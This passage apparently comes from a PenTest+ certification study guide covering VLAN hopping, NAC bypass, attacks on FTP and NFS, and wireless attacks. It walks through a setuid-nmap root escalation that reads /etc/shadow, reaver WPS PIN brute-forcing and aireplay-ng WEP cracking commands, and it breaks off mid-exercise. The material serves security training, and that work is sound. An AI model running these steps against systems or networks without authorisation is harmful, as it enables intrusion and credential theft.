Virtual local area networks (VLANs) are broadcast domains used to provide logical separation on the same physical network segment. A VLAN is referenced under IEEE 802.1Q. A network switch groups ports together into a VLAN group and uses a VLAN ID to identify the VLAN. On a switch, a port can either be an access port or a trunk port. A trunk port is designated on a switch to carry VLAN-tagged traffic between switches. An access port sends and receives untagged traffic and is assigned to a single VLAN (access ports are typically for a host-to-switch connection). VLAN tags restrict access to tagged traffic to only ports designated to a particular VLAN group. VLAN hopping is an attack vector used to gain access to resources on another VLAN. Two methods are used to accomplish VLAN hopping: switch spoofing and double tagging.

Switch spoofing is a type of VLAN hopping attack that occurs when an attacker can emulate a valid trunking switch on the network by speaking 802.1Q. This is a result of either a default configuration or an improperly configured switch. The default mode assigned to ports on a Cisco switch is configured as "dynamic desirable," which means that the switch will negotiate the port mode as either an access port or trunk port. Once the attacker announces that his workstation is a trunk port, the switch will trunk all VLANs over the switch port that the attacker's workstation is plugged into. The attacker will now have access to all VLAN traffic destined for the valid switch. This can be mitigated by preventing ports on the switch from negotiating trunks and configuring the ports to be access ports. Double tagging is a result of a switch port being configured to use native VLANs, where an attacker can craft a packet and prepend a false VLAN tag along with its native VLAN. The native VLAN tag (i.e., VLAN 1) is not forwarded (since it is the native VLAN), but the false VLAN tag is forwarded to the next switch and sent to the target host as if it originated from the target's native VLAN. This type of attack can be used to bypass layer 3 access controls, where only certain hosts on the local network can access sensitive/secure resources. This is another type of configuration weakness on switches and can be mitigated by not associating any hosts in the native VLAN or by disabling the native VLAN on all trunk ports.

### Bypassing Network Access Controls

Organizations may use Network Access Control (NAC) either in hardware or software to quarantine rogue devices that are not identified in a network security policy, provide a BYOD (bring your own device) model that can also support guest network access and isolation for vendors or customers, or profile users and devices to mitigate network threats. In cloud-based environments like Microsoft Azure, a customer can use Network Security Groups (NSG) to enforce and control Internet or intranet communications across different workloads within virtual networks. As an example, a DHCP-based NAC solution uses a proxy server to intercept and validate DHCP requests from the client. If the client is authorized according to a list of MACs or a set of other criteria identified by a profiling process, the client is assigned an IP address and connected to the network. In essence, an NAC is an enforceable security boundary that provides another layer of protection to the overall security stack.

There are three methods a pentester can use to bypass NAC:

• Violating trust relationships An example would be spoofing a source IP or MAC address of a valid device (e.g., legacy printer) controlled in a distinct NSG that doesn't support 802.1x authentication. You can do this with the macchanger application in Kali Linux, for example:

• Exploiting implementation weaknesses This includes weak authentication mechanisms in wireless protocols or even DHCP-based NAC solutions, where the attacker can possibly bypass the NAC protection altogether by assigning a static IP address on the network instead of trying to get one through DHCP.

• Taking advantage of configuration weaknesses An example would be if NAC enforces policy on IPv4 addresses but is not configured to protect IPv6 addresses.

### Researching an Attack

You'll need to take what you see on the network and turn it into usable intelligence to attack. Let's follow two examples, one using FTP and another using SMB and NFS.

### An Attack on FTP

Many applications make use of File Transfer Protocol (FTP) for transferring files to and from hosts over the network. The FTP server provides read/write access to files and directories for remote users and inherited authentication and file sharing permissions from the local operating system. To detect the presence of anonymous FTP, a pentester can use the ftp-anon.nse script, as shown in Figure 3-15.

### Figure 3-15 Identifying FTP servers that allow anonymous login with Nmap

TIP The Metasploit auxiliary module called ftp\_login is another useful way of detecting anonymous FTP servers on the network.

Using the example provided in Figure 3-18, the ftp-syst.nse script was able to detect the version of FTP running on the server to be vsFTPd 2.3.4. In Kali, you can use the Exploit-DB (https://www.exploit-db.com) command-line interface (CLI) search tool called searchsploit to look for known exploits. The result of running the CLI search tool shows that the version of vsFTPd running on the server is susceptible to backdoor remote code execution vulnerability, as shown in Figure 3-16.

### Figure 3-16 Searchsploit vsFTPd

The unix/ftp/vsftpd\_234\_backdoor Metasploit module can be used to exploit the vulnerable service and obtain root access to the device, as shown in Figure 3-17. Many other types of vulnerabilities plague FTP applications other than backdoors, including directory traversals, DoS attacks, buffer overflow attacks, local and remote file inclusion (LFI/RFI) attacks, and authentication bypass attacks, to name a few. FTP has been around for many years and will likely stick around for some time until organizations phase out legacy devices with modern-day technology.

### Figure 3-17 vsFTPd backdoor command execution in Metasploit

An Attack on Samba and NFS

In heterogeneous environments, it may be necessary for Windows, UNIX, and macOS users to share files and collaborate among each other. Samba is the implementation of the Common Internet File System (CIFS) protocol that enables file and print sharing among Windows and UNIX hosts over the network. Linux/UNIX servers use Samba to communicate with Windows clients to support their file and print sharing needs.

Certain releases of Samba contain a vulnerability in the LSA RPC service that, if exploited, can trigger a heap overflow and allow an unprivileged user to execute arbitrary code on the system as the root user. The Metasploit module Samba SetInformationPolicy AuditEventsInfo Heap Overflow is an example that will attempt to exploit this.

CAUTION You can look at the full source of this module in the Metasploit GitHub: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/samba/setinfopolicy\_heap.rb. The module will run for some time and may take a while to complete. The Metasploit module does allow you to define your start and stop addresses in case your operating system is not defined within the module.

NFS is another file sharing capability that provides a means for privileged execution. To see a list of file systems shared out to the UNIX environment, you can use the showmount -e \<ip address\> command or you can use nmap, specifying port 111/tcp (RPC port) and using the nfs-showmount.nse script, as shown in Figure 3-18. The RPC port specifies the versions of NFS that are supported by the server (i.e., v2, v3, and v4), as well as the NFS port 2049/tcp or 2049/udp and the mount ports.

### Figure 3-18 Using the NFS showmount script in nmap

NOTE The rpcinfo output can be quite important, especially when mounting an NFS open share through an SSH tunnel or proxy when file systems are only shared within the local area network. Typically, NFS will make the RPC call to the server and acquire the appropriate ports to mount the remote file system; this all happens behind the scenes during the connection. When you establish the reverse tunnel with your external target, you will need to specify the mount port within the mount option in your command syntax when mounting through the tunnel. Once your tunnel is configured to forward all mount traffic to the SSH target, you can mount the file system using the forwarded mount ports (e.g., mount -o port=2049,mountport=44096,proto=tcp 127.0.0.1:/home /home).

During a pentest engagement, you may come across NFS file systems that are shared out to everyone on the network and have little to no protection against remote attacks. In this section, we will provide some examples of how to exploit NFS file systems that are exported with root access and leverage those permissions to escalate privileges against an NFS client. To follow along, you can assume we have the following level of access on the network:

• Root-level access to an attack laptop on the internal network

• NFS server that shares out a file system to everyone (no access controls)

• Compromised user-level access to an NFS client on the network

Using the information provided in Figure 3-18, we can see that the /home file system is shared out to "everyone." Next, we can mount the /home file system using the mount command and mount it to an unused directory on our local file system, as illustrated in Figure 3-19. In order to mount file systems in UNIX, you must be a privileged user (i.e., root). Now, in the home directory, there are four potential user accounts. The question is: Did we mount the file system with root privileges? In Figure 3-20, we created a file called "am-i-root" and listed the directory contents and see that we created the file as UID "0."

### Figure 3-19 Mounting the /home file system and verifying file system privileges

### Figure 3-20 Setuid nmap executable

TIP NFSv3 and earlier will map numeric UIDs and GIDs to files and directories on an NFS file system. When you mount an NFS share from a client using NFSv3, you may see a UID or GID in place of a username or group because your local operating system cannot map to them, either because you are not on the domain (i.e., LDAP) or the user does not exist. During an engagement, if you are able to mount an NFS file system and you see UID values instead of usernames, you can create a user account on your local host with the same UID value and navigate around the file system impersonating the victim username. In NFSv4, the UID and GUID mapping feature can be disabled, since the client and server can now be configured to exchange user and group names over the network.

From our testing laptop, we can now conceivably modify arbitrary files and move tools to anywhere we wish on the remote file system as root. Using user-level access on the NFS client, we copy over a binary so we can change the ownership of the program to root and apply the setuid bit from the attacker laptop, so when the program executes, it runs with root privileges (owner of the file). We choose to use the nmap binary, as the version on the NFS client still supports the interactive feature that will allow us to bypass the Bash and Bourne Shell setuid shell program restrictions. After we copied the nmap binary into the user's home directory on the NFS share, from our attack laptop we changed the ownership of nmap to be root:root, then used the chmod command to apply the sticky bit with 4777, as shown in Figure 3-20.

Then from the NFS client as the user account, we executed the setuid nmap binary using interactive mode, which allows you to interact with the shell from within Nmap. From the Nmap prompt, we executed !/bin/sh to drop to a shell prompt with root privileges, as shown in Figure 3-21, under the effective user id (EUID) value, then read the /etc/shadow file for good measure. Imagine if the user were an LDAP user account with remote login access to all of the LDAP clients on the network and the /home file system were mounted on each host. The impact of the vulnerability would be even more significant, as the user could conceivably obtain root privileges on every host on the network.

### Figure 3-21 Nmap interactive mode

The attack laptop provided the ability to change the owner and execution bit of the nmap binary to root. Without root access to an attack platform that could mount the NFS /home file system, this attack would not have been possible. Some NFS file systems are exported with nosuid, root squash, or restricted root access to only certain hosts, as these are recommended best practices for NFS and mitigations to defeat these types of privilege escalation attacks. Essentially, this can take away the ability to execute setuid programs and force NFS to map the root UID to user nfsnobody. However, as we mentioned previously, you may still be able to create local accounts on the attack laptop (where you have root privileges) with UIDs that the NFS server knows about and impersonate the user in order to access directories and files from the NFS file system.

TIP Instead of exploiting the interactive feature of Nmap, you could use some shell escape techniques to bypass the shell setuid program restrictions. A few of them consist of using built-in programs like vi or awk. From the NFS client, you would copy the program from your file path over to the NFS file share. Then from the attack laptop, apply root ownership and the setuid bit. Then you should be able to execute the programs with root privileges.

## Chapter 4: Wireless and RF Attacks

In this chapter, you will learn about

• Wireless attack methods

• Specific wireless attacks and when to use them

• The mystery of wireless password cracking

The PenTest+ exam objectives cover wireless and radio frequency (RF)–based vulnerabilities and exploits. In this chapter, we will focus on some of the basics a pentester needs to know about wireless network protocols found in the 802.11 (routers and access points), 802.15 (Bluetooth), radio frequency ID (RFID), and near field communications (NFC) technologies. We will investigate various tools for interacting with wireless devices, conducting discovery, and ways to attack wireless devices.

### 802.11 Wireless

Wireless pentests are often designed to evaluate the reach of a wireless network, whether or not the traffic flowing over that network can be intercepted (or influenced) by an attacker and if an attacker can gain access to the network wirelessly. This involves evaluating possible flaws in the implementation of the network, as well as the reach of the network, and it requires special hardware. Pentesters need to understand how these networks work in order to identify implementation weaknesses and select the right hardware and software tools for the job.

### Wireless Networking Overview

Before we talk about how to attack wireless networks, let's take a minute to talk about how they work. Remember, as a pentester, your job is not only to prove that systems can be broken but to recommend how to fix them. To do that and be a successful attacker, it will be helpful to know what frames look like, how networks are implemented, and how encryption standards are used in wireless networking.

### 802.11 Wireless Standards

First, let's talk about how wireless networks transmit data. Wireless networks use specific radio frequencies and channels using defined power ranges. Each frequency range is divided into multiple channels. The Federal Communications Commission (FCC) defines and limits the power ranges that can be applied to Wi-Fi–enabled devices, such as your typical home wireless router. The IEEE 802.11 (https://www.ieee.org) standards define wireless networking. Table 4-1 describes common wireless standards (also referred to as protocols) that a pentester is likely to come across during an engagement.

![](RackMultipart20240405-1-nwk5q_html_cff469a98233de74.png)

### Table 4-1 Wireless Standards

As you can see, Wi-Fi networks work over the 2.4 GHz or 5 GHz spectrum bands. Each band maintains its own properties and supports various deployment scenarios. The 2.4 GHz band is broken up into 14 channels, each with a bandwidth between 20 and 22 MHz of total separation. This spectrum is supported by many of the 802.11 protocols and provides coverage over a longer range; however, transfer speeds are much slower compared to 5 GHz. The 5 GHz band is broken up into over 20 channels and supports faster transfer speeds using a much wider bandwidth than the 2.4 GHz band, but less coverage by area.

When the 2.4 GHz band gets crowded, the network is more likely to experience slower transfer speeds. Newer wireless routers and networking equipment support dual bands, which have the capability to transmit and receive data over 2.4 GHz and 5 GHz spectrum bands. This option provides flexibility and can support an organization's decision to use the 5 GHz band to reduce the likelihood of interference when there are many access points (APs) competing on a channel.

NOTE Laws may govern what you are allowed to transmit based on frequency and power use, based on your geographical location and federal regulations. The FCC documents their rules and regulations in Title 47 of the Code of Federal Regulations. Section 15 applies to radio frequency devices, including consumer wireless in computers.

### Wireless Modes

Wireless network devices that follow the 802.11 standards have the ability to function in different modes, depending on the requirements of the network. These modes are different implementations with separate considerations for security. The two modes for a wireless network are ad hoc and infrastructure.

In ad hoc mode, wireless clients (stations or STA) are connected in a peer-to-peer mode, and this is commonly referred to as an independent basic service set (IBSS). This is the least common approach, and is least likely to be found in most pentest engagements. Figure 4-1 provides a basic example of computers configured in ad hoc mode.

### Figure 4-1 Ad hoc mode

Infrastructure mode is the most common configuration in both home and commercial applications. In infrastructure mode, the wireless clients communicate with a central device called a wireless AP instead of directly communicating with each other, like in ad hoc mode. This is often referred to as a basic service set (BSS) or wireless local area network (WLAN). The AP manages the wireless network and broadcasts a case-sensitive, 32-alphanumeric-character service set identifier (SSID) to advertise its existence. The SSID is the name of the WLAN. Wireless clients can associate with an AP when they are in range and are configured to use the same SSID. However, the AP may impose additional requirements before allowing a client to join the network, such as authentication credentials (for various encryption standards) and a compatible wireless data rate.

The AP facilitates connectivity to either wired networks or additional APs via a distribution system (DS). Having multiple APs connected within the same local area network (LAN) provides a much larger coverage area for wireless clients. Each AP has an associated basic service set identifier (BSSID) that describes its unique media access control (MAC) address. This provides network clarity when multiple APs are on the same WLAN broadcasting the same SSID. Since all wireless network packets contain the originator's BSSID, the packet can be traced. An extended service set (ESS) is formed when a DS connects multiple APs. ESS provides mobility between the wireless clients so they are free to roam within the coverage area. The extended service set identifier (ESSID) is the network name of the ESS. Figure 4-2 is an example of how a DS can be used to extend service areas for WLAN configurations.

### Figure 4-2 Infrastructure mode

### 802.11 Frames

Inside the traffic, a wireless datagram is a logical chunk of data that is transferred over a wireless network at the transport layer of the OSI model. Much like a typical IEEE 802.3 Ethernet network, frames store much-needed information, such as physical and logical attributes of the device sending the transmission. Frames package together all this information into packets and define a beginning and ending as the information is transferred to the recipient of the communication. The IEEE 802.11 standards define three primary frames associated with wireless network communication (see Table 4-2).

![](RackMultipart20240405-1-nwk5q_html_9836d7f5fb5cd6cb.png)

### Table 4-2 802.11 Frames

The beacon frame includes properties that disclose details about the AP that are used for association, including the SSID, type of encryption, MAC, channel, and vendor information. Figure 4-3 shows the SSID value from a packet capture in Wireshark. Finding open wireless networks without any encryption makes it extremely easy for your nosy neighbor to connect and start eavesdropping on your network. This information will become very useful during the wireless scanning process.

### Figure 4-3 SSID value from packet capture in Wireshark

EXAM TIP Eavesdropping is the process of listening to a private conversation without the other party knowing you are doing so. You may see this term referenced in questions on the exam.

### Wireless Security and Encryption Standards

To protect the confidentiality of data in transit and prevent unauthorized access to devices operating over the wireless network, many wireless networks implement security standards and use encryption. Common implementations of wireless security used for small office/home office (SOHO) environments include Wi-Fi Protected Setup (WPS), Wired Equivalent Privacy (WEP), Wi-Fi Protected Access (WPA), WPA2, and the new WPA3. The information provided here will help you understand the attacks and give you context for why they work.

### WPS

The WPS protocol was designed to allow users to set up secure wireless networks and reduce the overall complexity of associating additional hosts to the network. This is not, in itself, an implementation of encryption so much as a way of securing initial wireless device setup using WPA/WPA2 security without having to use complex passphrases. WPS is commonly found in consumer appliances and may use in-band methods, such as using a personal identification number (PIN) during setup or pushing a button to initiate the network discovery process, or out-of-band methods such as near field communication (NFC), where proximity initiates the connection. For the exam, we'll focus on in-band methods. Push-button-connect (PBC) initiates a request for a PIN. The PIN can be configured in a graphical user interface (GUI) on the device or may be printed on the device's label. Other implementations of the PIN setup include both an internal and an external registrar. In the first case, the AP has some interface in which a client can enter a PIN in order to negotiate a connection, often via WPA/WPA2. In the second case (external), the AP provides a PIN which must be entered on the client in order to initiate the connection.

WPS PINs are eight digits. But WPS doesn't process all eight digits at once to process an authentication request. Instead, it processes this PIN in three parts during authentication. The last digit is a checksum. If this checksum is incorrect, the AP will send a NACK message to end the session. If the checksum is correct, it attempts to validate the first part (four digits). Again, if that is incorrect, the AP sends a NACK. If the first half is correct, then it evaluates the second part, which is three digits.

EXAM TIP WPS requires user interaction to initiate communication. It uses WPA/WPA2 security and an eight-digit PIN. Tools for attack include reaver, wash, and wifite for offline pixie dust attacks or online brute-force PIN attacks.

### WEP

WEP was included as part of the original standard for 802.11 and was the only encryption protocol available to protect 802.11a and 802.11b wireless networks before WPA. WEP relies on a secret key that is shared between the access point and the clients on the wireless network. The WEP encryption process protects confidentiality of the wireless network using the RC4 stream cipher. RC4 is a symmetric key cipher used to expand a short key into an infinite pseudo-random keystream. The sender will XOR the plaintext message with the keystream to generate the ciphertext. The receiver of the ciphertext will use the same shared secret key to generate an identical keystream and XOR the keystream with the ciphertext to reveal the plaintext message. In order to verify packets have not been modified in transit, WEP uses an integrity check field that is populated with a CRC-32 checksum, which is included as an encrypted part of the payload. A 24-bit initialization vector (IV) is also used to augment the shared secret key and produce a different RC4 key for each packet. The IV is a binary number, which is a fixed-size input that helps decrease the probability of encrypting two ciphertexts with the same keystream. Figure 4-4 provides an overview of the WEP encryption process.

### Figure 4-4 WEP encryption standard

EXAM TIP WEP was the standard before WPA. Key reuse in the encryption stream (24-bit IV) makes it vulnerable to cracking, as well as to fragmentation and replay attacks. Use aireplay-ng to generate IV samples and aircrack-ng to decipher the secret key. You can also use wifite to conduct attacks against WEP.

### WPA

WPA was introduced as an interim replacement for WEP and did not require consumers to replace hardware to support the new security measure. Instead, most vendors released software/firmware updates that could be installed on existing devices. There are multiple flavors of WPA based on the 802.11i wireless security standard: WPA, WPA2, and WPA3. Each of these has Personal or Enterprise modes.

With Personal mode, users use a single shared password (a preshared key [PSK]) that is the same for every endpoint. The PSK (password) can be between 8 and 63 ASCII characters in length. This is fine for small networks with trusted users, where 802.1x-incompatible devices are in use or with guest networks where a captive portal is impossible. With Enterprise mode, users use certificates or credentials (a username and password) via an authentication service, like Remote Authentication Dial-In User Service (RADIUS), instead. These mechanisms are more secure and most often found in enterprise business networks. Every user who authenticates will have a unique session with the AP, making it harder for a malicious user to compromise the individual key when sniffing packets on the same SSID.

WPA increased from 63-bit and 128-bit encryption in WEP to 256-bit encryption technology. WPA implemented the Temporal Key Integrity Protocol (TKIP) after WEP encryption was broken. TKIP is symmetric encryption that still uses the same WEP programming and RC4 encryption algorithm, but it encrypts each data packet with a stronger and unique encryption key. It also includes some additional security algorithms made up of a cryptographic message integrity check, IV sequence mechanism that includes hashing, a rekeying mechanism to ensure key generation after 10,000 packets, and to increase cryptographic strength, it includes a per-packet key-mixing function. These were designed to add extra protection against social engineering, replay and injection attacks, weak-key attacks, and forgery attempts. WPA2 introduced the use of the Advanced Encryption Standard (AES) instead of TKIP. After 2006, all new devices bearing the Wi-Fi trademark required mandatory WPA2 certification.

WPA and WPA2 use a four-way handshake to establish connection. As referenced in Figure 4-5, once the client (or supplicant) and the AP establish a request for association, they use the PBKDF2 algorithm, the PSK, and SSID to derive a shared secret key called a pairwise master key (PMK). The client generates an SNonce, and the AP generates an ANonce. The AP sends the ANonce (message 1 of the four-way handshake) to the client. The AP and the client then derive a temporary pairwise transient key (PTK) using the PMK, the ANonce, the SNonce, and the MAC from the client and the AP. The PTK has five separate keys in 64 bytes: the key confirmation key (KCK); the key encryption key (KEK); a temporal key (TK), which is only valid until the session ends; a Tx key; and an Rx key. The client uses the KCK to generate a message integrity check (MIC), which is sent along with the SNonce in the second message of the four-way handshake. Since the client and the AP are using the same values, the same algorithm, and the same shared secret, they are both able to validate the MIC and decrypt each other's messages. At this point, the AP and client can encrypt the data in transit without sharing the secret over the wire. The temporal key between the client and the AP is only valid until the session ends. A group transient key (GTK) is exchanged and used to encrypt the broadcast traffic on the wireless network.

### Figure 4-5 A detailed diagram of the four-way handshake1

NOTE If you want to read about the PBKDF2 function in all its dry crypto glory, the details are in RFC2898 Section 5.2.

Like WPA2, WPA3 uses AES and, ultimately, a four-way handshake. However, WPA3 is designed for perfect-forward secrecy. This means that the encryption key changes such that its compromise will not result in a breach of data encrypted before that compromise took place. Additionally, WPA3 uses something called Simultaneous Authentication of Equals (SAE) in an attempt to solve WPA and WPA2's vulnerability to dictionary attacks. SAE is a type of key exchange also referred to as Dragonfly. As with WPA and WPA2, the AP and supplicant start with a shared, salted secret. However, during the handshake, they agree on the parameters to use with either elliptical curve cryptography (ECC) or finite field cryptography (FFC).2 Each party then performs computationally intractable operations to create an asymmetric key whose master key is now exchanged as a surrogate for the PMK in the original four-way handshake. This time, though, cracking the PMK never provides the original shared secret. It also does not grant access to all prior network traffic, because the key changes each time. This is a very simplified explanation, but if you would like to read more about how this works, you can read everything about it in RFC7664.

EXAM TIP WPA uses a four-way handshake and a shared passphrase. Weaknesses in handshake implementation are vulnerable to dictionary attacks (PMKID hash capture and WPA handshake capture). Deauthentication attacks force a new handshake to capture information needed to generate guesses. Tools for attack include aircrack-ng, aireplay-ng, airodump-ng, wifite, cowpatty, genpmk, and hashcat. WPA3 hides the passphrase behind additional security with the Dragonfly key exchange. WPA3 is weak to downgrade attacks and timing attacks. The Dragonblood vulnerabilities target the Dragonfly key exchange.

### Wireless Testing Equipment

Wireless adapters receive and transmit information to other devices on a wireless network. In other words, you will need a wireless antenna in order to observe and interact with wireless networks. When selecting an antenna, you will want to consider supported bands, chipset, and type.

Most antennas will list which of the 802.11 standards they support, and you'll need to know the one you are targeting in order to choose the best hardware. Some will support multiple standards, which can be useful. However, there are cases where performance considerations will make you select a more specialized antenna. It is unlikely you will be tested on brand specifics during the exam, but you should be aware of this need.

Many internal wireless adapters do not allow you to use monitor mode, a requirement for eavesdropping. External adapters overcome this issue and typically have better range. But finding the right adapter that works with operating systems like Kali Linux can be a challenging endeavor. Adapters come in many shapes and sizes and can support both single-band or dual-band (2.4 GHz and 5 GHz) networks. The two most important factors that make a wireless adapter compatible for operating systems are the chipset (hardware) and the drivers (software). The following are popular chipsets that support monitor mode and injection and are compatible with the Kali operating system:

• Atheros AR9271

• Ralink RT3070

• Ralink RT3572

NOTE Once you have an antenna and have installed an adapter, in Kali Linux, the iwlist command can be used to show compatible channels, frequencies, encryption capabilities, and APs the interface has associated with. The iw and iwconfig commands can be used to manipulate the interface by enabling or disabling it or by manually configuring it on a wireless network.

As for antenna type, let's say you want to be discreet during a wireless assessment. The type of antenna you choose will affect how close you have to be, where you need to be to get a good signal, and the strength of the signal you can use. Directionality and gain are the two antenna attributes you will most need to consider.

Wi-Fi antennas are either directional or omnidirectional. Directional antennas have comparatively better signal strength, but require more precise aim in relation to the signal. This means you can be farther away as long as you can point your antenna toward the target and have a good line of sight. But not all directional antennas are used at long range. Most RFID badge readers are flat panel near-range directional antennas. Omnidirectional antennas can work in any direction, but often sacrifice strength. So, you need to be closer in order to work.

When we talk about the strength of a signal, we're really talking about the gain. Antenna gain (dBi) is a relative measure of how well an antenna performs when receiving and transmitting data. This number is useful in determining signal reach when examining the physical perimeter of a wireless network and can often be used by detection devices when seeking rogue wireless devices.

NOTE LearnTomato has a great article about Wi-Fi antennas at https://learntomato.flashrouters.com/how-to-increase-wifi-range-with-the-right-wifi-antenna/.

### Attacking Wireless

Now we're ready to talk about the fun part: the attack. In this section, we'll discuss attacks against different wireless implementations and some tactics you might use when targeting wireless networks in general. If you plan to create a home lab for experimentation, the following basic items are recommended for the testing environment:

• Laptop (standard keyboard layout) with Kali Linux and a wireless card that supports injection

• Wireless router that supports WEP, WPA, and WPS

• Wireless client that can be used to generate traffic

### Wireless Scanning and Discovery

Stumbling is a surveillance technique used for discovering SSIDs, router vendor information and signal strength, MAC addresses, channels, access control protections (encryption), and more. This process is a little more involved than just enabling Wi-Fi on your phone to see if you can find any open access points to connect to. Stumbling would typically capture wireless data along with global positioning system (GPS) data in order to map what is found. This often builds a locality-specific set of information similar to what you might find in the Wireless Geographical Location Engine (WiGLE), which can be found at https://wigle.net/. Wardriving is a tactical process for surveying an area for access points while in a moving vehicle. The goal is preliminary reconnaissance and to pinpoint wireless networks and potential targets in a certain area of interest. If the customer has a large campus or facility, this technique may be useful for simulating real-world scenarios and demonstrating adversarial capabilities by various threat actors.

Aircrack-ng (https://www.aircrack-ng.org) is open-source software that provides a suite of tools for conducting RF communication monitoring and security testing of Wi-Fi networks. Airodump-ng is a popular wireless sniffing tool included with the aircrack-ng toolset that can be used during a pentest to discover and validate wireless targets. Airodump-ng helps identify the ESSID and BSSID of access points and any station/client MAC address that is associated with the AP, including various attributes like the channel it is connected to, the transfer speed, and access control (encryption) for connecting to the AP.

Airodump-ng is a command-line tool that is natively installed in Kali Linux. However, before using the tool you must first put your wireless adapter into monitor mode so your computer can listen and inject packets onto wireless networks. Use the airmon-ng command, which is included in the aircrack-ng suite of tools, in order to configure your adapter in monitor mode. Figure 4-6 shows an example of starting airmon-ng in monitor mode for the wlan1 interface:

Figure 4-6 airmon-ng

airmon-ng start wlan1

NOTE If your wireless adapter fails to go into monitor mode in Kali, try killing processes with rfkill unblock all. Then try to put the adapter in monitor mode. If it still doesn't work, your wireless adapter may not support monitor mode.

Once the adapter is configured to listen and inject packets onto the network, you are in business. Now, you can use airodump-ng to start capturing packets from various wireless networks within the range of your adapter and antenna. Airodump-ng will hop from channel to channel to identify wireless devices it can receive beacons from if no channels are specified at the command line. Channel hopping makes capturing packets from your targets more difficult. In this case, you can sit on a single channel in order to target collection against a specific range of APs. Figure 4-7 shows how to use airodump-ng to capture packets based on specific channel settings for the AP and dump the output into multiple formats to include TXT, PCAP, and CSV for easy parsing in Microsoft Excel. One important thing to note is the PWR reading for each station (client) and BSSID (router). This is the wireless signal strength, and it is measured in decibels milliwatts (dBm), expressed in negative values. The closer the number is to zero, the stronger the signal and the closer you are to the device.

Figure 4-7 airodump-ng

airodump-ng -c 4,5 wlan1mon -w channel4-5.out

EXAM TIP Kismet (https://www.kismetwireless.net) can also do 802.11 sniffing and perform wireless intrusion detection, and it has better GPS support than airodump. You might choose to use Kismet for stumbling and mapping or for wardriving and follow up with airodump for further inspection. If you save your data as a PCAP, you can replay it in Wireshark (https://wireshark.org), which provides the capability to separate frames for further packet inspection.

### Cracking WPS

For WPS, let's start by identifying WPS networks using a tool called wash in Kali. Even though WPS is designed to require user interaction to initiate data exchange, some devices are still discoverable. Wash also supports active probing of detected wireless networks to identify whether they support WPS. Figure 4-8 provides an example of how to locate WPS networks using wash.

Figure 4-8 Locate WPS networks with wash

Once you have identified a WPS PIN–controlled target, you can use the reaver command in Kali Linux to brute-force attack the WPS PIN. Reaver attacks a WPS implementation weakness in the registrar functionality, where it only takes 11,000 attempts to guess the correct WPS PIN. Figure 4-9 shows example output of reaver successfully recovering the PIN for a WPS network after targeting a wireless repeater. You can execute reaver using the following command syntax:

Figure 4-9 Successful recovery of WPS PIN

# reaver -i \<interface\> -b \<target MAC of AP\> -c \<channel\> -vvv -K 1

The command options include the following:

• -i Your wireless interface name

• -b MAC of the target AP

• -c Channel to camp on

• -vvv Verbosity level

• -K Execute pixie dust attack (brute-force WPS PIN)

NOTE A wireless repeater (also called a range extender) rebroadcasts the same signal from an AP. By repeating the signal, it is able to create another network for clients outside the range of the AP to associate with, thus extending the wireless coverage. These types of devices are recommended for residential use.

Once you have the PIN, the AP will give you the WPA password. You can recover the password using the reaver command. Figure 4-10 provides an example of successfully recovering the password used to connect to the wireless network.

Figure 4-10 Successfully recovering the WPA password

CAUTION This attack does not work against all WPS-enabled devices. Some devices require a user to press a button on the outside of the router, which will only enable WPS for a short period, limiting the window for attack. Other devices have built-in protection against brute-force PIN attempts and will lock out the device attempting to connect to the network after too many unsuccessful attempts. This is done by the AP applying a MAC filter against the hardware address of the network interface card making the connections. You can try and bypass the PIN lockout by setting a delay in reaver and running macchanger to change the MAC address of your wireless interface.

### Cracking WEP

First, review Figure 4-4. When you know the unencrypted value of the data that is being sent (i.e., an ARP packet) and you know the IV, this reduces the number of things you need to guess in order to derive the encryption key. You see, most implementations of WEP initialize hardware using an IV of 0, then increment by 1. This can iterate through the 24-bit IV space in a matter of hours (depending on the amount of network activity). That forces the network to initialize the IV back to 0 and repeat the use of IVs.

Let's walk through an exercise for recovering a WEP key by replaying (injecting) an ARP packet on the network to generate new unique IVs. We will assume that you have a WEP-enabled access point configured with at least one wireless client on the network that can generate ARP traffic (e.g., ping a nonexistent host continuously during the exercise) and are using Kali Linux as your testing host.

1. Open up a terminal window in Kali Linux and list all available wireless interface cards.

# airmon-ng

TIP You can also list available wireless interface cards using the command iwconfig.

2. Enable monitor mode on the wireless interface card that supports injection. In this case, wlan1 was switched to wlan1mon for monitor mode.

# airmon-ng start wlan1

3. Use the wireless interface enabled for monitor mode to identify the channel your WEP network is operating on, using either the BSSID (MAC address) or ESSID (i.e., network name). The channel number will be listed under the "CH" column. In this case, the access point was operating on channel 9.

# airodump-ng wlan1mon

Once you have identified the channel, use CTRL-C to exit out of airodump-ng and make note of the channel, network name, and MAC address for the target AP.

4. Test the wireless device packet injection, as shown next. If you receive "Injection is working!" you can move on to step 5. If not, check to make sure you are using a compatible wireless card.

# aireplay-ng -9 -e \<network name\> -a \<target MAC\> \<interface\>

The command options include the following:

• -9 Means injection

• -e Wireless network name

• -a MAC of the target AP

• \<interface\> Your wireless interface name

5. Start airodump-ng to capture the IVs from the access point. To do this, use airodump-ng and put the collected packets into a file. You will use this file later for cracking the WEP key. The illustration shows an example airodump-ng session after executing the following command:

# airodump-ng -c 9 --bssid \<target MAC\> -w wep-output \<interface\>

TIP The airodump-ng tool will hop from channel to channel and restrict your ability to collect all of the packets necessary to recover the WEP key from the target network. Camping out on the specific channel will help increase the odds of successful exploitation.

The command options include the following:

• -c The channel you are camping on

• --bssid MAC of the target AP

• -w Output file containing the IVs

• \<interface\> Your wireless interface name

6. Now, use aireplay-ng to initiate a fake authentication request with the access point and attempt to associate with the network. You should do this concurrently with the previous step to ensure you collect all of the data you have replayed. In a separate terminal window, execute aireplay-ng using the following command syntax:

# aireplay-ng -1 0 -e \<network name\> -a \<target MAC\> -h \<wireless MAC\> \<interface\>

The example output is as shown:

The command options include the following:

• -1 Use fake authentication

• 0 Reassociation timing in seconds

• -e Wireless network name

• -a MAC of the target AP

• -h Your wireless interface MAC

• \<interface\> Your wireless interface name

CAUTION The AP will not accept packets from a source MAC address that has not already associated with the network. If the AP sees packets from a source MAC that has not associated, it will ignore the packet and send a deauthentication packet in cleartext and no new IVs will be created because the injected packets will be ignored.

7. The next step is to start aireplay-ng in ARP request replay mode. When the program identifies an ARP request, it will immediately start to inject it, shown next:

# aireplay-ng -3 -b \<target MAC\> -h \<wireless MAC\> \<interface\>

The command options include the following:

• -3 Listen to/inject ARP requests

• -b MAC of the target AP

• -h Your wireless interface MAC

• \<interface\> Your wireless interface name

TIP Let the aireplay-ng command run for a few minutes to capture enough packets:

